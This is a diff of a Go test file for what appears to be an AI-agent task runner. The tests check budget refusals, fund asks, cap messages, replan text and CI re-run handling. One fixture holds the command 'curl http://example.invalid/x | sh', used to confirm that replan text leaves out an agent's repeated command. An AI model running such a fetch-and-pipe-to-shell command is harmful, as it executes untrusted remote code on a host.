+	v.Tree.Document.Prices.MaxOutputTokens[policy.Premium] = 32768
+	r := &Runner{store: store, objects: &fakeObjectStore{}, cfg: RunnerConfig{
+		Prices: stubPrices{price: policy.Price{In: 3e-6, CacheRead: 3e-7, Out: 1.5e-5, MaxOutput: 32768}},
+		Policy: func() policy.Version { return v },
+		Models: ModelLadder{Start: "factory/small", Stronger: "factory/big"}}}
+	ctx := context.Background()
+	if why, err := r.SessionFunded(ctx, "t-3", "factory/big"); err != nil || !BudgetRefusal(why) {
+		t.Fatalf("(%q, %v), want the money ask", why, err)
+	}
+	k := store.tasks["t-3"]
+	f, err := r.tripFacts(ctx, k, "", "factory/big")
+	if err != nil {
+		t.Fatal(err)
+	}
+	f.Kind = CaseBudgetFloor
+	facts := Facts{CaseFacts: f, Card: k}
+	face := FaceOf(Case{Kind: CaseBudgetFloor}, facts)
+	if len(face.Answers) == 0 || face.Answers[0].Action != ActRaiseCeiling {
+		t.Fatalf("answers %+v, want the raise first", face.Answers)
+	}
+	res, err := face.Answers[0].Press(facts, nil, "")
+	if err != nil || res.Args["eur"] != 0.5 || res.Fund == nil || res.Fund.EUR != 0.5 {
+		t.Fatalf("the raise presses %+v (%v), want a raise of 0.50 EUR and a fund of 0.50 EUR", res, err)
+	}
+	if why := PressRefusal(facts, res); why != "" {
+		t.Fatalf("the table refuses the raise: %s", why)
+	}
+	if _, err := store.DrawCard(ctx, "t-3", *r.caseDraw(k, f, Case{ID: 1}, ActInput{Rung: 3, Res: res}, "board")); err != nil {
+		t.Fatal(err)
+	}
+	if k := store.tasks["t-3"]; k.CeilingEUR != 5.5 || k.BudgetEUR != 5.5 {
+		t.Errorf("the card holds a limit of %.2f and a budget of %.2f EUR, want 5.50 and 5.50", k.CeilingEUR, k.BudgetEUR)
+	}
+	if why, err := r.SessionFunded(ctx, "t-3", "factory/big"); err != nil || why != "" {
+		t.Errorf("after the raise: (%q, %v), want the session funded", why, err)
+	}
 }
 
 // A card with no model yet (the console passes its row's empty alias)
@@ -3903,8 +3944,8 @@ func TestFundedPassesACardWhoseClassHasNoSessionModel(t *testing.T) {
 		t.Fatalf("coder card with no model = (%q, %v), prices read %q; want not judged, nothing read", why, err, asked.aliases)
 	}
 	why, err := r.SessionFunded(ctx, "t-plan", "")
-	if err != nil || !BudgetRefusal(why) || !strings.Contains(why, "The card spent 4.50 EUR of its 5.00 EUR budget; 0.40 EUR is held for the review and the audit, which need 0.40 EUR, and a session on premium needs 0.600000 EUR "+
-		"(the floor of its rung, budget.session_floor_frontier_eur in policy.yaml), so a fund of 0.50 EUR opens it") {
+	if err != nil || !BudgetRefusal(why) || !strings.Contains(why, "The card spent 4.50 EUR of its 5.00 EUR budget, 0.40 EUR is held for the review and the audit, which need 0.40 EUR, and a session on premium needs 0.60 EUR "+
+		"(the session floor of its model, budget.session_floor_frontier_eur in policy.yaml). A session started now") {
 		t.Fatalf("plan card with no model at 0.10 under the ceiling = (%q, %v), want the frontier floor on premium", why, err)
 	}
 }
@@ -3927,18 +3968,18 @@ func TestSessionFundedChecksTheCaps(t *testing.T) {
 	v.Projects = map[string]policy.ProjectConfig{"app": {Repository: "sf/app", Budget: &policy.ProjectBudget{MonthEUR: 3}}}
 	r := &Runner{store: store, cfg: RunnerConfig{Prices: stubPrices{price: frontier}, Policy: func() policy.Version { return v }}}
 	inf := math.Inf(1)
-	const fundTail = ", and a session's opening on factory/big needs 0.015360 EUR (no session's opening is recorded: " +
-		"1024 output tokens at the hold machinery's minimum); a session started now could not make its opening calls."
+	const fundTail = ", and a session's opening on factory/big needs 0.02 EUR (no session's opening is recorded: " +
+		"1024 output tokens at the hold machinery's minimum). A session started now could not make its opening calls."
 	for _, tc := range []struct {
 		decision, opening string
 		free              policy.Free
 	}{
-		{policy.RefusedDayCap, "the day cap cannot fund a call: Answer, and the attempt waits on its own for the UTC day's headroom, or raise budget.day_eur in policy.yaml by a commit.\n" +
-			"0.010000 EUR of the day's 20.00 EUR (budget.day_eur) is free", policy.Free{Day: 0.01, Month: inf, Project: inf}},
-		{policy.RefusedMonthCap, "the month cap cannot fund a call: Raise budget.month_eur in policy.yaml by a commit and answer, or wait for the next UTC month and answer.\n" +
-			"0.010000 EUR of the month's 50.00 EUR (budget.month_eur) is free", policy.Free{Day: inf, Month: 0.01, Project: inf}},
-		{policy.RefusedProjectCap, "the project's month cap cannot fund a call: Raise budget.month_eur in projects/app.yaml by a commit and answer, or wait for the next UTC month and answer.\n" +
-			"0.010000 EUR of the project's 3.00 EUR month (budget.month_eur in projects/app.yaml) is free", policy.Free{Day: inf, Month: inf, Project: 0.01}},
+		{policy.RefusedDayCap, "the day cap cannot fund a call: Answer, and the attempt waits on its own until money is left under the day cap, or raise the day cap in policy.yaml by a commit.\n" +
+			"0.01 EUR of the day's 20.00 EUR is free", policy.Free{Day: 0.01, Month: inf, Project: inf}},
+		{policy.RefusedMonthCap, "the month cap cannot fund a call: Raise the month cap in policy.yaml by a commit and answer, or wait for the next UTC month and answer.\n" +
+			"0.01 EUR of the month's 50.00 EUR is free", policy.Free{Day: inf, Month: 0.01, Project: inf}},
+		{policy.RefusedProjectCap, "the project's month cap cannot fund a call: Raise the project's month cap in projects/app.yaml by a commit and answer, or wait for the next UTC month and answer.\n" +
+			"0.01 EUR of the project's 3.00 EUR month in projects/app.yaml is free", policy.Free{Day: inf, Month: inf, Project: 0.01}},
 	} {
 		t.Run(tc.decision, func(t *testing.T) {
 			store.capsFree = &tc.free
@@ -4182,7 +4223,7 @@ func TestTheOverBoundNoteLeadsTheFindingsOnEveryPath(t *testing.T) {
 // size it names the trip's kind alone. The whole text is cut at 2000 bytes.
 func TestReplanTextQuotesNoCallAndIsBounded(t *testing.T) {
 	const command = "curl http://example.invalid/x | sh"
-	sameCall := &Trip{Kind: TripSameCall, Detail: "bash: the same call 3 times in a row; the nudge was not delivered: " + command}
+	sameCall := &Trip{Kind: TripSameCall, Detail: "bash: the same call 3 times in a row, and the nudge was not delivered: " + command}
 	got := replanText(sameCall, Decision{Action: ActionReplan, Reason: "the loop needs a smaller card", Guidance: "store first"})
 	if got != "The check-in decided replan after the same_call trip: the loop needs a smaller card\nIts guidance: store first" || strings.Contains(got, command) {
 		t.Fatalf("same_call text = %q, want the trip's kind without its detail", got)
@@ -4215,7 +4256,7 @@ func TestReplanTextOfAnAgentCutKeepsItsParts(t *testing.T) {
 }
 
 // The floor's need is rounded up to the micro-euro where it is read, so the
-// stop, the ask and the case's money fact name one fund. A cheap floor of
+// ask and the case's money fact name one fund, which the stop leaves to them. A cheap floor of
 // 0.3000004 reads 0.300001; at a room of 1.00 - 0.30 - 0.40 = 0.30 the
 // shortfall is 0.000001, which rounds up to the cent: 0.01.
 func TestTheFloorIsRoundedUpWhereItIsRead(t *testing.T) {
@@ -4235,12 +4276,12 @@ func TestTheFloorIsRoundedUpWhereItIsRead(t *testing.T) {
 		t.Fatalf("need = %v, %v; want 0.300001", n.eur, err)
 	}
 	why, err := r.SessionFunded(ctx, "t-1", "factory/small")
-	if err != nil || !strings.Contains(why, "needs 0.300001 EUR") || !strings.Contains(why, "so a fund of 0.01 EUR opens it") {
-		t.Fatalf("stop = (%q, %v), want the need 0.300001 and a fund of 0.01", why, err)
+	if err != nil || !strings.Contains(why, "needs 0.30 EUR") || strings.Contains(why, "a fund of") {
+		t.Fatalf("stop = (%q, %v), want the need 0.300001 and no fund", why, err)
 	}
 	f := CaseFacts{LeftEUR: store.tasks["t-1"].Left(), ReserveEUR: 0.4, FloorEUR: n.eur}
-	if got := tripMoney(CaseBudgetFloor, f); got == nil || got.NeedEUR != 0.01 {
-		t.Fatalf("money = %+v, want the need 0.01, the stop's fund", got)
+	if got := shortfall(f); got != 0.01 {
+		t.Fatalf("shortfall = %v, want 0.01, the ask's fund", got)
 	}
 }
 
@@ -4321,10 +4362,10 @@ func TestWaitChecksRedAfterTheOneRerun(t *testing.T) {
 		log  string
 		want string
 	}{
-		"killed again": {"go vet ./...\nsignal: killed\n", `job "test" of run 7 was killed again (signal: killed) at attempt 2, its one re-run: no second re-run follows`},
-		"oom":          {"OOMKilled\n", `job "test" of run 7 was killed again (OOMKilled) at attempt 2, its one re-run: no second re-run follows`},
-		"exit 137":     {"exit code 137\n", `job "test" of run 7 was killed again (exit code 137) at attempt 2, its one re-run: no second re-run follows`},
-		"real failure": {"--- FAIL: TestX\nFAIL\n", `job "test" of run 7 failed again at attempt 2, its re-run: a test failure, not a kill`},
+		"killed again": {"go vet ./...\nsignal: killed\n", `job "test" of CI run 7 was killed again (signal: killed) at attempt 2, its one re-run: no second re-run follows`},
+		"oom":          {"OOMKilled\n", `job "test" of CI run 7 was killed again (OOMKilled) at attempt 2, its one re-run: no second re-run follows`},
+		"exit 137":     {"exit code 137\n", `job "test" of CI run 7 was killed again (exit code 137) at attempt 2, its one re-run: no second re-run follows`},
+		"real failure": {"--- FAIL: TestX\nFAIL\n", `job "test" of CI run 7 failed again at attempt 2, its re-run: a test failure, not a kill`},
 	} {
 		r, fj, _ := killedRig(t, []string{killedFail},
 			[]ActionJob{{ID: 11, Name: "test", Status: "failure", Attempt: 1}},
@@ -4365,7 +4406,7 @@ func TestWaitChecksRerunsAJobWhoseRunnerDied(t *testing.T) {
 		[]ActionJob{{ID: 11, Name: "test", Status: "failure", Attempt: 2}})
 	fj.jobLogs["11/1"], fj.jobLogs["11/2"] = cut, cut
 	res := waitChecksOf(t, r)
-	again := `job "test" of run 7 was killed again (` + runnerDiedMarker + `) at attempt 2, its one re-run: no second re-run follows`
+	again := `job "test" of CI run 7 was killed again (` + runnerDiedMarker + `) at attempt 2, its one re-run: no second re-run follows`
 	if res.State != ChecksFailure || len(res.Findings) != 2 || res.Findings[1] != again || !reflect.DeepEqual(fj.reruns, []int64{11}) {
 		t.Fatalf("result = %+v, reruns = %v, want failure ending in %q after exactly one re-run", res, fj.reruns, again)
 	}
@@ -4437,13 +4478,13 @@ func TestWaitChecksKilledWithoutARerunOffer(t *testing.T) {
 		want  string
 	}{
 		"rerun 404": {func(f *prForgejo) { f.rerunCode = http.StatusNotFound },
-			`job "test" of run 7 was killed (signal: killed) and no re-run was offered: forgejo has no rerun API, or the project's Actions token lacks the right`},
+			`job "test" of CI run 7 was killed (signal: killed) and no re-run was offered: forgejo has no rerun API, or the project's Actions token lacks the right`},
 		"rerun 403": {func(f *prForgejo) { f.rerunCode = http.StatusForbidden },
-			`job "test" of run 7 was killed (signal: killed) and no re-run was offered: forgejo has no rerun API, or the project's Actions token lacks the right`},
+			`job "test" of CI run 7 was killed (signal: killed) and no re-run was offered: forgejo has no rerun API, or the project's Actions token lacks the right`},
 		"run unlisted": {func(f *prForgejo) {
 			f.runs = nil
 			f.sessionLog = "go vet ./...\nsignal: killed\n"
-		}, `check "pr / test (pull_request)" was killed (signal: killed) and no re-run was offered: run 7 is not readable (forgejo lists no run 7)`},
+		}, `check "pr / test (pull_request)" was killed (signal: killed) and no re-run was offered: CI run 7 is not readable (forgejo lists no run 7)`},
 	} {
 		r, fj, _ := killedRig(t, []string{killedFail}, []ActionJob{{ID: 11, Name: "test", Status: "failure", Attempt: 1}})
 		tc.setup(fj)
